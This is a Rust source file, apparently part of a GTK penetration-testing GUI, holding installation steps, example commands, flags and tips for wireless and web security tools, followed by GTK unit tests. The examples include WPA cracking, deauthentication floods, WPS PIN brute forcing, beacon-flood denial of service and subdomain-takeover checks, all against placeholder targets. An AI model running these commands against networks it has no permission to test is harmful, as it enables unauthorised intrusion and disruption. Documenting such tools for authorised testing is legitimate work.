                ToolFlag { flag: "--email_file".to_string(), description: "Save emails to file".to_string() },
                ToolFlag { flag: "-a".to_string(), description: "Include meta data".to_string() },
                ToolFlag { flag: "-v".to_string(), description: "Verbose output".to_string() },
            ],
            tips: vec![
                "Spider relevant websites for targeted wordlists.",
                "Combine with company-specific information.",
                "Use appropriate depth for comprehensive coverage.",
                "Clean and process generated wordlists before use.",
            ],
        },
        "hashid" => ToolInstructions {
            name: "HashID".to_string(),
            description: "HashID is a tool to identify the different types of hashes used to encrypt data.",
            installation: vec![
                "# Install from pip",
                "pip3 install hashID",
                "",
                "# Install from source",
                "git clone https://github.com/psypanda/hashid.git",
                "cd hashid",
                "python3 setup.py install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Identify hash type".to_string(),
                    command: "hashid '5d41402abc4b2a76b9719d911017c592'".to_string(),
                },
                ToolExample {
                    description: "Multiple hashes".to_string(),
                    command: "hashid 'hash1' 'hash2' 'hash3'".to_string(),
                },
                ToolExample {
                    description: "Extended mode".to_string(),
                    command: "hashid -m '5d41402abc4b2a76b9719d911017c592'".to_string(),
                },
                ToolExample {
                    description: "Output to file".to_string(),
                    command: "hashid -o results.txt '5d41402abc4b2a76b9719d911017c592'".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-m".to_string(), description: "Extended mode".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output to file".to_string() },
                ToolFlag { flag: "-j".to_string(), description: "JSON output".to_string() },
                ToolFlag { flag: "-h".to_string(), description: "Show help".to_string() },
                ToolFlag { flag: "-v".to_string(), description: "Version information".to_string() },
            ],
            tips: vec![
                "Use extended mode for more detailed analysis.",
                "Identify hash types before attempting to crack.",
                "Save results for documentation and reference.",
                "Cross-reference with hash databases.",
            ],
        },
        // Wireless Attack Tools
        "aircrack-ng" => ToolInstructions {
            name: "Aircrack-ng".to_string(),
            description: "Aircrack-ng is a complete suite of tools to assess WiFi network security, focusing on capturing packets and cracking WEP/WPA passwords.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install aircrack-ng",
                "",
                "# Kali Linux (pre-installed)",
                "aircrack-ng --help",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Capture packets".to_string(),
                    command: "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture.cap wlan0mon".to_string(),
                },
                ToolExample {
                    description: "Crack WPA handshake".to_string(),
                    command: "aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap".to_string(),
                },
                ToolExample {
                    description: "Deauthenticate client".to_string(),
                    command: "sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55 wlan0mon".to_string(),
                },
                ToolExample {
                    description: "Monitor mode setup".to_string(),
                    command: "sudo airmon-ng start wlan0".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-w".to_string(), description: "Wordlist file".to_string() },
                ToolFlag { flag: "-b".to_string(), description: "BSSID of target".to_string() },
                ToolFlag { flag: "-c".to_string(), description: "Channel number".to_string() },
                ToolFlag { flag: "-w".to_string(), description: "Write to file".to_string() },
                ToolFlag { flag: "-0".to_string(), description: "Deauthentication mode".to_string() },
                ToolFlag { flag: "-a".to_string(), description: "Access point BSSID".to_string() },
                ToolFlag { flag: "-5".to_string(), description: "Number of packets".to_string() },
            ],
            tips: vec![
                "Ensure wireless card supports monitor mode.",
                "Capture WPA handshake before cracking.",
                "Use good wordlists for better success rates.",
                "Be aware of legal requirements for wireless testing.",
            ],
        },
        "kismet" => ToolInstructions {
            name: "Kismet".to_string(),
            description: "Kismet is a wireless network detector, sniffer, and intrusion detection system that works with 802.11 layer2 wireless networks.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install kismet",
                "",
                "# Install from source",
                "git clone https://github.com/kismetwireless/kismet.git",
                "cd kismet",
                "sudo apt install build-essential libmicrohttpd-dev libnl-3-dev libpcap-dev",
                "./configure && make && sudo make install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Start Kismet".to_string(),
                    command: "sudo kismet -c kismet.conf".to_string(),
                },
                ToolExample {
                    description: "Capture to specific file".to_string(),
                    command: "sudo kismet -t capture.kismet".to_string(),
                },
                ToolExample {
                    description: "With specific interface".to_string(),
                    command: "sudo kismet -i wlan0mon".to_string(),
                },
                ToolExample {
                    description: "GPS logging".to_string(),
                    command: "sudo kismet --use-gps".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-c".to_string(), description: "Configuration file".to_string() },
                ToolFlag { flag: "-i".to_string(), description: "Capture interface".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Capture file prefix".to_string() },
                ToolFlag { flag: "-f".to_string(), description: "Force override".to_string() },
                ToolFlag { flag: "--use-gps".to_string(), description: "Enable GPS logging".to_string() },
                ToolFlag { flag: "-n".to_string(), description: "No splash screen".to_string() },
                ToolFlag { flag: "-v".to_string(), description: "Verbose output".to_string() },
            ],
            tips: vec![
                "Configure properly before starting captures.",
                "Use GPS for location-based analysis.",
                "Monitor for extended periods for comprehensive data.",
                "Review captured data for network mapping.",
            ],
        },
        "reaver" => ToolInstructions {
            name: "Reaver".to_string(),
            description: "Reaver implements a brute force attack against WiFi Protected Setup (WPS) registrar PINs to recover WPA/WPA2 passphrases.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install reaver",
                "",
                "# Install from source",
                "git clone https://github.com/t6x/reaver-wps-fork-t6x.git",
                "cd reaver-wps-fork-t6x/src",
                "./configure && make && sudo make install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic WPS attack".to_string(),
                    command: "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv".to_string(),
                },
                ToolExample {
                    description: "With custom timeout".to_string(),
                    command: "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -t 10 -vv".to_string(),
                },
                ToolExample {
                    description: "Fixed channel".to_string(),
                    command: "reaver -i wlan0mon -c 6 -b AA:BB:CC:DD:EE:FF -vv".to_string(),
                },
                ToolExample {
                    description: "With PIXIE Dust attack".to_string(),
                    command: "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF --pixie-dust -vv".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-i".to_string(), description: "Wireless interface".to_string() },
                ToolFlag { flag: "-b".to_string(), description: "Target BSSID".to_string() },
                ToolFlag { flag: "-c".to_string(), description: "Channel number".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Timeout in seconds".to_string() },
                ToolFlag { flag: "-vv".to_string(), description: "Verbose output".to_string() },
                ToolFlag { flag: "--pixie-dust".to_string(), description: "PIXIE Dust attack".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "WPS PIN".to_string() },
                ToolFlag { flag: "-d".to_string(), description: "Delay between attempts".to_string() },
            ],
            tips: vec![
                "Ensure stable connection to target AP.",
                "Monitor for lockouts and adjust timing.",
                "PIXIE Dust attack is faster on vulnerable routers.",
                "Document all WPS vulnerabilities found.",
            ],
        },
        "bully" => ToolInstructions {
            name: "Bully".to_string(),
            description: "Bully is a WPS brute force tool that implements a brute force attack against WiFi Protected Setup (WPS) PINs.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install bully",
                "",
                "# Install from source",
                "git clone https://github.com/aanarchyy/bully.git",
                "cd bully",
                "make && sudo make install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic WPS attack".to_string(),
                    command: "bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 4".to_string(),
                },
                ToolExample {
                    description: "With PIN length".to_string(),
                    command: "bully wlan0mon -b AA:BB:CC:DD:EE:FF -l 8 -v 4".to_string(),
                },
                ToolExample {
                    description: "Force specific channel".to_string(),
                    command: "bully wlan0mon -c 6 -b AA:BB:CC:DD:EE:FF -v 4".to_string(),
                },
                ToolExample {
                    description: "With custom delay".to_string(),
                    command: "bully wlan0mon -b AA:BB:CC:DD:EE:FF -d 2 -v 4".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-b".to_string(), description: "Target BSSID".to_string() },
                ToolFlag { flag: "-c".to_string(), description: "Channel number".to_string() },
                ToolFlag { flag: "-l".to_string(), description: "PIN length".to_string() },
                ToolFlag { flag: "-d".to_string(), description: "Delay between attempts".to_string() },
                ToolFlag { flag: "-v".to_string(), description: "Verbose level (1-5)".to_string() },
                ToolFlag { flag: "-s".to_string(), description: "Skip first PIN".to_string() },
                ToolFlag { flag: "-f".to_string(), description: "Force operation".to_string() },
            ],
            tips: vec![
                "Start with default PIN length of 8.",
                "Monitor for AP lockouts and adjust timing.",
                "Use verbose output to monitor progress.",
                "Combine with other wireless tools for testing.",
            ],
        },
        "wifite" => ToolInstructions {
            name: "Wifite".to_string(),
            description: "Wifite is a wireless auditor that attacks multiple WEP, WPA, and WPS networks in a row.",
            installation: vec![
                "# Install from pip",
                "pip3 install wifite2",
                "",
                "# Install from source",
                "git clone https://github.com/derv82/wifite2.git",
                "cd wifite2",
                "sudo python3 setup.py install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Scan and attack all networks".to_string(),
                    command: "sudo wifite2 -i wlan0mon".to_string(),
                },
                ToolExample {
                    description: "Attack specific network".to_string(),
                    command: "sudo wifite2 -i wlan0mon -b AA:BB:CC:DD:EE:FF".to_string(),
                },
                ToolExample {
                    description: "WPS only mode".to_string(),
                    command: "sudo wifite2 -i wlan0mon --wps".to_string(),
                },
                ToolExample {
                    description: "With wordlist".to_string(),
                    command: "sudo wifite2 -i wlan0mon -w wordlist.txt".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-i".to_string(), description: "Wireless interface".to_string() },
                ToolFlag { flag: "-b".to_string(), description: "Target BSSID".to_string() },
                ToolFlag { flag: "-w".to_string(), description: "Wordlist for WPA".to_string() },
                ToolFlag { flag: "--wps".to_string(), description: "WPS attack only".to_string() },
                ToolFlag { flag: "--all".to_string(), description: "Attack all networks".to_string() },
                ToolFlag { flag: "-v".to_string(), description: "Verbose output".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Passive scanning".to_string() },
            ],
            tips: vec![
                "Automates multiple attack types efficiently.",
                "Good for testing multiple networks quickly.",
                "Monitor progress and adjust parameters as needed.",
                "Be aware of legal requirements for testing.",
            ],
        },
        "mdk4" => ToolInstructions {
            name: "MDK4".to_string(),
            description: "MDK4 is a wireless attack tool that implements various attacks including deauthentication, beacon flooding, and packet injection.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install mdk4",
                "",
                "# Install from source",
                "git clone https://github.com/aircrack-ng/mdk4.git",
                "cd mdk4",
                "make && sudo make install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Beacon flood attack".to_string(),
                    command: "sudo mdk4 wlan0mon b -f AA:BB:CC:DD:EE:FF".to_string(),
                },
                ToolExample {
                    description: "Deauthentication attack".to_string(),
                    command: "sudo mdk4 wlan0mon d -c AA:BB:CC:DD:EE:FF".to_string(),
                },
                ToolExample {
                    description: "EAPOL start flood".to_string(),
                    command: "sudo mdk4 wlan0mon e -f AA:BB:CC:DD:EE:FF".to_string(),
                },
                ToolExample {
                    description: "Authentication DOS".to_string(),
                    command: "sudo mdk4 wlan0mon a -i AA:BB:CC:DD:EE:FF".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "b".to_string(), description: "Beacon flood attack".to_string() },
                ToolFlag { flag: "d".to_string(), description: "Deauthentication attack".to_string() },
                ToolFlag { flag: "e".to_string(), description: "EAPOL start flood".to_string() },
                ToolFlag { flag: "a".to_string(), description: "Authentication DOS".to_string() },
                ToolFlag { flag: "-f".to_string(), description: "Target BSSID".to_string() },
                ToolFlag { flag: "-c".to_string(), description: "Channel number".to_string() },
                ToolFlag { flag: "-i".to_string(), description: "Target BSSID".to_string() },
            ],
            tips: vec![
                "Use for testing wireless network robustness.",
                "Be careful with DOS attacks on production networks.",
                "Monitor network responses during attacks.",
                "Document all wireless vulnerabilities found.",
            ],
        },
        // Web Application Tools (additional)
        "dirbuster" => ToolInstructions {
            name: "DirBuster".to_string(),
            description: "DirBuster is a multi-threaded Java application designed to brute force directories and files names on web/application servers.",
            installation: vec![
                "# Download from GitHub",
                "wget https://github.com/Va5c0/DirBuster/releases/latest/download/DirBuster-1.0.2.jar",
                "",
                "# Requires Java 8+",
                "java -version",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic directory scan".to_string(),
                    command: "java -jar DirBuster-1.0.2.jar -u https://example.com".to_string(),
                },
                ToolExample {
                    description: "With custom wordlist".to_string(),
                    command: "java -jar DirBuster-1.0.2.jar -u https://example.com -l wordlist.txt".to_string(),
                },
                ToolExample {
                    description: "With file extensions".to_string(),
                    command: "java -jar DirBuster-1.0.2.jar -u https://example.com -x php,asp,html".to_string(),
                },
                ToolExample {
                    description: "Save results".to_string(),
                    command: "java -jar DirBuster-1.0.2.jar -u https://example.com -o results.txt".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-u".to_string(), description: "Target URL".to_string() },
                ToolFlag { flag: "-l".to_string(), description: "Wordlist file".to_string() },
                ToolFlag { flag: "-x".to_string(), description: "File extensions".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Number of threads".to_string() },
                ToolFlag { flag: "-r".to_string(), description: "Recursive scan".to_string() },
                ToolFlag { flag: "-H".to_string(), description: "Custom headers".to_string() },
            ],
            tips: vec![
                "Use comprehensive wordlists for better coverage.",
                "Specify relevant file extensions for target technology.",
                "Adjust threads based on target responsiveness.",
                "Save results for manual verification and testing.",
            ],
        },
        "whatweb" => ToolInstructions {
            name: "WhatWeb".to_string(),
            description: "WhatWeb is a web scanner that identifies websites, technologies, and version information.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install whatweb",
                "",
                "# Install from gem",
                "gem install whatweb",
                "",
                "# Install from source",
                "git clone https://github.com/urbanadventurer/WhatWeb.git",
                "cd WhatWeb",
                "sudo ruby whatweb.rb",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic web scan".to_string(),
                    command: "whatweb https://example.com".to_string(),
                },
                ToolExample {
                    description: "Verbose output".to_string(),
                    command: "whatweb -v https://example.com".to_string(),
                },
                ToolExample {
                    description: "Aggressive mode".to_string(),
                    command: "whatweb -a 3 https://example.com".to_string(),
                },
                ToolExample {
                    description: "Log results".to_string(),
                    command: "whatweb --log-verbose=whatweb.log https://example.com".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-v".to_string(), description: "Verbose output".to_string() },
                ToolFlag { flag: "-a".to_string(), description: "Aggression level (1-4)".to_string() },
                ToolFlag { flag: "--log-verbose".to_string(), description: "Log verbose output".to_string() },
                ToolFlag { flag: "--log-brief".to_string(), description: "Log brief output".to_string() },
                ToolFlag { flag: "--log-xml".to_string(), description: "Log XML output".to_string() },
                ToolFlag { flag: "--log-json".to_string(), description: "Log JSON output".to_string() },
                ToolFlag { flag: "--max-redirects".to_string(), description: "Maximum redirects".to_string() },
            ],
            tips: vec![
                "Use higher aggression levels for thorough scanning.",
                "Log results for later analysis and reporting.",
                "Combine with other web scanning tools.",
                "Be aware of rate limiting on targets.",
            ],
        },
        "wappalyzer" => ToolInstructions {
            name: "Wappalyzer".to_string(),
            description: "Wappalyzer identifies technologies on websites including content management systems, web servers, and frameworks.",
            installation: vec![
                "# Web browser extension",
                "# Install from https://www.wappalyzer.com/",
                "",
                "# Command line version",
                "npm install -g wappalyzer",
                "",
                "# Python library",
                "pip3 install python-wappalyzer",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Analyze website".to_string(),
                    command: "wappalyzer https://example.com".to_string(),
                },
                ToolExample {
                    description: "JSON output".to_string(),
                    command: "wappalyzer --json https://example.com".to_string(),
                },
                ToolExample {
                    description: "With user agent".to_string(),
                    command: "wappalyzer --user-agent 'Custom Bot 1.0' https://example.com".to_string(),
                },
                ToolExample {
                    description: "Python library usage".to_string(),
                    command: "python3 -c 'import wappalyzer; print(wappalyzer.identify(\"https://example.com\"))'".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "--json".to_string(), description: "JSON output format".to_string() },
                ToolFlag { flag: "--user-agent".to_string(), description: "Custom user agent".to_string() },
                ToolFlag { flag: "--timeout".to_string(), description: "Request timeout".to_string() },
                ToolFlag { flag: "--verify".to_string(), description: "Verify SSL certificates".to_string() },
                ToolFlag { flag: "--help".to_string(), description: "Show help".to_string() },
                ToolFlag { flag: "--version".to_string(), description: "Show version".to_string() },
            ],
            tips: vec![
                "Use for technology stack identification.",
                "JSON output is useful for automation.",
                "Combine with vulnerability scans for context.",
                "Document technology stack for attack planning.",
            ],
        },
        "subjack" => ToolInstructions {
            name: "Subjack".to_string(),
            description: "Subjack is a tool for finding subdomain takeovers by checking DNS records for CNAMEs pointing to services.",
            installation: vec![
                "# Install from go",
                "go install -v github.com/haccer/subjack@latest",
                "",
                "# Install from source",
                "git clone https://github.com/haccer/subjack.git",
                "cd subjack",
                "go build",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Check domain for takeovers".to_string(),
                    command: "subjack -d example.com".to_string(),
                },
                ToolExample {
                    description: "With wordlist".to_string(),
                    command: "subjack -d example.com -w subdomains.txt".to_string(),
                },
                ToolExample {
                    description: "Check specific subdomain".to_string(),
                    command: "subjack -d example.com -s test.example.com".to_string(),
                },
                ToolExample {
                    description: "JSON output".to_string(),
                    command: "subjack -d example.com -json".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-d".to_string(), description: "Domain to check".to_string() },
                ToolFlag { flag: "-w".to_string(), description: "Wordlist file".to_string() },
                ToolFlag { flag: "-s".to_string(), description: "Specific subdomain".to_string() },
                ToolFlag { flag: "-json".to_string(), description: "JSON output format".to_string() },
                ToolFlag { flag: "-v".to_string(), description: "Verbose output".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Number of threads".to_string() },
                ToolFlag { flag: "-h".to_string(), description: "Show help".to_string() },
            ],
            tips: vec![
                "Check for vulnerable CNAME configurations.",
                "Use comprehensive subdomain lists.",
                "Document all potential takeover opportunities.",
                "Verify findings manually before exploitation.",
            ],
        },
        _ => ToolInstructions {
            name: "Unknown Tool".to_string(),
            description: "No instructions are available for this tool yet.",
            installation: vec![],
            examples: vec![],
            common_flags: vec![],
            tips: vec![],
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::OnceLock;

    static GTK_AVAILABLE: OnceLock<bool> = OnceLock::new();

    fn ensure_gtk_init() -> bool {
        *GTK_AVAILABLE.get_or_init(|| {
            if let Err(err) = gtk4::init() {
                eprintln!("Failed to initialize GTK - tests will be skipped: {}", err);
                false
            } else {
                true
            }
        })
    }

    #[test]
    fn test_tool_execution_panel_creation() {
        if !ensure_gtk_init() {
            return;
        }

        let panel = ToolExecutionPanel::new();
        assert_eq!(panel.get_selected_tool(), Some("nmap".to_string()));
        assert!(panel.instructions_scroll.child().is_some());
    }

    #[test]
    fn test_tool_selection_updates() {
        if !ensure_gtk_init() {
            return;
        }

        let panel = ToolExecutionPanel::new();
        panel.tool_selector.set_active_id(Some("gobuster"));
        assert_eq!(panel.get_selected_tool(), Some("gobuster".to_string()));
        assert!(panel.instructions_scroll.child().is_some());
    }

    #[test]
    fn test_terminal_operations() {
        if !ensure_gtk_init() {
            return;
        }

        let panel = ToolExecutionPanel::new();
        panel.write_to_terminal("Line 1\\n");
        panel.clear_terminal();
        panel.execute_in_terminal("whoami");
    }
}
